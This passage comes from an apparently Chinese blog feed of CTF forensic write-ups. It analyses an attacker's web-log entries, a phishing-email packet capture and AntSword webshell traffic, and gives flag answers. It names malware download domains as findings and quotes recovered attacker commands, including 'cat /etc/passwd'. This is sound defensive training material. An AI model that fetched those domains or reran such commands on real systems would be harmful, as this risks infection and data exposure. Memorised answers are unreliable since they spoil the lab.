&lt;p>&lt;strong>2、黑客使用的浏览器指纹是什么，提交指纹的md5：&lt;/strong>&lt;br>
思路是什么，现在我们知道黑客的ip了啊，日志位置我们也知道了啊，直接筛选一波黑客ip不就行了；&lt;br>
命令：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">cat&lt;/span> &lt;span class="nx">access&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mi">1&lt;/span> &lt;span class="o">|&lt;/span>&lt;span class="nx">grep&lt;/span> &lt;span class="mf">192.168&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mf">200.2&lt;/span> &lt;span class="o">|&lt;/span>&lt;span class="nx">more&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>得到浏览器指纹&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250331111216.png" alt="Pasted image 20250331111216">&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250331111144.png" alt="Pasted image 20250331111144">&lt;br>
加密如下：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{2D6330F380F44AC20F3A02EED0958F66}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="flag3">flag3&lt;/h1>
&lt;p>&lt;strong>3、查看包含index.php页面被访问的次数，提交次数：&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">cat&lt;/span> &lt;span class="nx">access&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mi">1&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">grep&lt;/span> &lt;span class="s2">&amp;#34;/index.php&amp;#34;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">wc&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">l&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="sb">`wc -l`&lt;/span> &lt;span class="nx">命令用于统计行数，即访问次数。&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250331111410.png" alt="Pasted image 20250331111410">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{27}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>发现不对，然后看一下日志：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">cat access.log.1 | grep &amp;#34;/index.php&amp;#34;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250407140259.png" alt="image.png">&lt;br>
最后发现了有两个返回200其他都是404，尝试了flag{2}也不对，在改为25的时候对了。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{25}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="flag4">flag4&lt;/h1>
&lt;p>&lt;strong>4、查看黑客IP访问了多少次，提交次数：&lt;/strong>&lt;br>
这里给出三个命令，都是可以查到的：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">cat access.log.1 | grep &amp;#34;192.168.200.2 - -&amp;#34; | wc -l
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cat access.log.1 | grep &amp;#34;192.168.200.2&amp;#34; | cut -d&amp;#39; &amp;#39; -f1 | sort | uniq -c
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">grep &amp;#34;192.168.200.2&amp;#34; access.log.1 | cut -d&amp;#39; &amp;#39; -f1 | sort | uniq -c
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250331111815.png" alt="Pasted image 20250331111815">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{6555}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="flag5">flag5&lt;/h1>
&lt;p>&lt;strong>5、查看2023年8月03日8时这一个小时内有多少IP访问，提交次数:&lt;/strong>&lt;br>
三条命令如下：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">cat&lt;/span> &lt;span class="nx">access&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mi">1&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">grep&lt;/span> &lt;span class="s2">&amp;#34;03/Aug/2023:08:&amp;#34;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">awk&lt;/span> &lt;span class="s1">&amp;#39;{print $1}&amp;#39;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">sort&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">nr&lt;/span>&lt;span class="o">|&lt;/span> &lt;span class="nx">uniq&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">c&lt;/span> &lt;span class="o">|&lt;/span>&lt;span class="nx">wc&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">l&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">grep&lt;/span> &lt;span class="s2">&amp;#34;03/Aug/2023:08:&amp;#34;&lt;/span> &lt;span class="nx">access&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mi">1&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">awk&lt;/span> &lt;span class="s1">&amp;#39;{print $1}&amp;#39;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">sort&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">nr&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">uniq&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">c&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">wc&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">l&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">cat&lt;/span> &lt;span class="nx">access&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mi">1&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">grep&lt;/span> &lt;span class="s2">&amp;#34;03/Aug/2023:08:&amp;#34;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">awk&lt;/span> &lt;span class="s1">&amp;#39;{print $1}&amp;#39;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">sort&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">nr&lt;/span>&lt;span class="o">|&lt;/span> &lt;span class="nx">uniq&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">c&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250331112024.png" alt="Pasted image 20250331112024">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{5}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>【玄机靶场】第六章 流量特征分析-小王公司收到的钓鱼邮件</title><link>http://localhost:1313/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0-%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90-%E5%B0%8F%E7%8E%8B%E5%85%AC%E5%8F%B8%E6%94%B6%E5%88%B0%E7%9A%84%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6/</link><pubDate>Fri, 05 Sep 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0-%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90-%E5%B0%8F%E7%8E%8B%E5%85%AC%E5%8F%B8%E6%94%B6%E5%88%B0%E7%9A%84%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6/</guid><description>&lt;img src="http://localhost:1313/images/48.webp" alt="Featured image of post 【玄机靶场】第六章 流量特征分析-小王公司收到的钓鱼邮件" />&lt;h1 id="flag1">flag1&lt;/h1>
&lt;p>&lt;strong>下载数据包文件 hacker1.pacapng，分析恶意程序访问了内嵌 URL 获取了 zip 压缩包，该 URL 是什么将该 URL作为 FLAG 提交 FLAG（形式：flag{xxxx.co.xxxx/w0ks//?YO=xxxxxxx}） (无需 http、https)；&lt;/strong>&lt;br>
搜索一下http协议，并且返回200的流量包，发现只有两个，然后打开第一个发现一个完整的url&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http contains &amp;#34;200&amp;#34;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250326171226.png" alt="Pasted image 20250326171226">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{tsdandassociates.co.sz/w0ks//?YO=1702920835}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="flag2">flag2&lt;/h1>
&lt;p>&lt;strong>下载数据包文件 hacker1.pacapng，分析获取到的 zip 压缩包的 MD5 是什么 作为 FLAG 提交 FLAG（形式：flag{md5}）；&lt;/strong>&lt;br>
打开第二个流量包：&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250326171344.png" alt="Pasted image 20250326171344">&lt;br>
导出zip格式文件&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250326171447.png" alt="Pasted image 20250326171447">&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250326171509.png" alt="Pasted image 20250326171509">&lt;br>
放HashClac里进行分析&lt;br>
得出MD5值&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">f17dc5b1c30c512137e62993d1df9b2f
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250326171524.png" alt="Pasted image 20250326171524">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{f17dc5b1c30c512137e62993d1df9b2f}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="flag3">flag3&lt;/h1>
&lt;p>&lt;strong>下载数据包文件 hacker1.pacapng，分析 zip 压缩包通过加载其中的 javascript 文件到另一个域名下载后续恶意程序， 该域名是什么?提交答案:flag{域名}(无需 http、https)&lt;/strong>&lt;br>
这个需要对js文件解码&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{shakyastatuestrade.com}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>【玄机靶场】第六章 流量特征分析-蚁剑流量分析</title><link>http://localhost:1313/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0-%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90-%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</link><pubDate>Fri, 05 Sep 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0-%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90-%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</guid><description>&lt;img src="http://localhost:1313/images/49.webp" alt="Featured image of post 【玄机靶场】第六章 流量特征分析-蚁剑流量分析" />&lt;h1 id="题目思路">题目思路&lt;/h1>
&lt;p>题目没有给出提示，但根据标题命名得知分析的是蚁剑流量包，所以我们可以直接查看http数据包进行分析。通过对统计数据的分析，我们可以得到http数据大致的访问信息，再通过查询语句过滤流量包得到成功访问的流量包&lt;/p>
&lt;h1 id="下载数据包">下载数据包&lt;/h1>
&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250326094312.png" alt="Pasted image 20250326094312">&lt;/p>
&lt;h1 id="flag1">flag1&lt;/h1>
&lt;p>&lt;strong>木马的连接密码是多少&lt;/strong>&lt;br>
1、左键点击“统计”-&amp;gt;“HTTP”-&amp;gt;“分组计数器”查看分析HTTP流量数据&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250326094453.png" alt="Pasted image 20250326094453">&lt;br>
2、http contains &amp;ldquo;200&amp;rdquo; 查看http协议中包含200（成功登录返回值）的流量包&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">http&lt;/span> &lt;span class="nx">contains&lt;/span> &lt;span class="s2">&amp;#34;200&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250326094554.png" alt="Pasted image 20250326094554">&lt;br>
3、右键其中一个请求包，点击“追踪流”-&amp;gt;“HTTP流”，进行查看分析，得到木马的连接密码是 &amp;ldquo;1&amp;rdquo;&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250326094636.png" alt="Pasted image 20250326094636">&lt;br>
flag&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{1}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="flag2">flag2&lt;/h1>
&lt;p>&lt;strong>黑客执行的第一个命令是什么&lt;/strong>&lt;br>
题目思路：通过分析刚才语句过滤后的流量包，我们发现这些就是蚁剑连接执行命令的流量包，可以直接根据流量包顺序进行分析查看分析，解码后（根据编码特征发现是Base64编码）得到第一个命令执行语句&lt;br>
1、查看第1个流量包中执行的命令信息&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250326094859.png" alt="Pasted image 20250326094859">&lt;br>
2、右键编码“Value”位置，点击“分组字节流”，开始位置调整为“2”，解码为调整为“Base64”，查看流量包执行的命令内容，得到第一个执行的命令 &amp;ldquo;id&amp;rdquo;（查看当前用户uid）&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">蚁剑会在编码前加两位随机生成的字符，所以需要调整开始位置&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250326094832.png" alt="Pasted image 20250326094832">&lt;br>
flag&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{id}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="flag3">flag3&lt;/h1>
&lt;p>&lt;strong>黑客读取了哪个文件的内容，提交文件绝对路径?&lt;/strong>&lt;br>
题目思路：根据之前的题目，我们已经找到了蚁剑连接的流量，以及执行的命令。继续对流量进行分析，查看流量包内容，得到读取的文件绝对路径&lt;br>
1、依次查看请求流量包以及以及返回流量包，第三个返回包中回显了大量信息，猜测查看了文件内容（其实根据经验可以直接看出查看的是/etc/passwd文件）&lt;br>
根据数据包来看，很明显是读取了passwd文件返回的内容。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250326095148.png" alt="Pasted image 20250326095148">&lt;br>
2、点击第3个请求包，右键编码“Value”位置，位置，点击“分组字节流”，开始位置调整为“2”，解码为调整为“Base64”，查看流量包执行的命令内容，得到黑客查看文件命令 &amp;ldquo;cat /etc/passwd&amp;rdquo;&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250326095520.png" alt="Pasted image 20250326095520">&lt;br>
flag&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{/etc/passwd}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="flag4">flag4&lt;/h1>
&lt;p>&lt;strong>黑客上传了什么文件到服务器，提交文件名?&lt;/strong>&lt;br>
题目思路：根据之前做的分析，继续查看后面的流量包。通过分析回显流量包，发现第5个返回包与第2个返回包相比多了一个文件，由此可以得到文件名，当然我们也可以直接分析解码得到上传文件名&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250326100706.png" alt="Pasted image 20250326100706">&lt;br>
flag&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{flag.txt}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="flag5">flag5&lt;/h1>
&lt;p>&lt;strong>黑客上传的文件内容是什么?&lt;/strong>&lt;br>
题目思路：我们在得到黑客上传的文件名后，通过查看返回包我们可以发现上传文件与执行系统命令的请求数据并不相同，只能查看请求数据包进行分析，通过对请求包数据的解码分析得到上传文件内容&lt;br>
1、点击第4个请求包，右键“追踪流”-&amp;gt;“HTTP流”，将编码复制，进行解码&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250326101848.png" alt="Pasted image 20250326101848">&lt;br>
2、首先进行URL解码（直接根据编码特征进行判断），查看后发现流量包后面有两段编码&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250326101908.png" alt="Pasted image 20250326101908">&lt;br>
3、最后一段编码明显是Base64编码（解码后就是上传文件的绝对路径），猜测第二段编码为文件内容（蚁剑上传的文件会对内容进行16进制加密），进行解密得到文件内容 &amp;ldquo;flag{write_flag}&amp;rdquo;&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">https://www.lddgo.net/string/hex
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">666C61677B77726974655F666C61677D0A
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250326102158.png" alt="Pasted image 20250326102158">&lt;br>
flag&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{write_flag}
